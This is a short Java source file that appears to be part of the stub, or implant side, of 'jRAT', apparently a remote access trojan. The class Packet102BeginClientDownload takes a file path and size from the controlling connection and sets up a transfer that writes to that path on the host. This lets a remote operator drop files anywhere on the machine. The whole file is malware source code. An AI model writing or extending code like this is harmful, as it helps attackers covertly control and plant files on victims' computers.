package se.jrat.stub.packets.incoming;

import java.io.File;

import se.jrat.common.io.FileCache;
import se.jrat.common.io.TransferData;
import se.jrat.stub.Connection;


public class Packet102BeginClientDownload extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String remote = Connection.instance.readLine();
		
		long l = Connection.instance.readLong();
		
		TransferData d = new TransferData();
		d.setLocalFile(new File(remote));
		d.setTotal(l);
		
		FileCache.put(remote, d);
	}

}
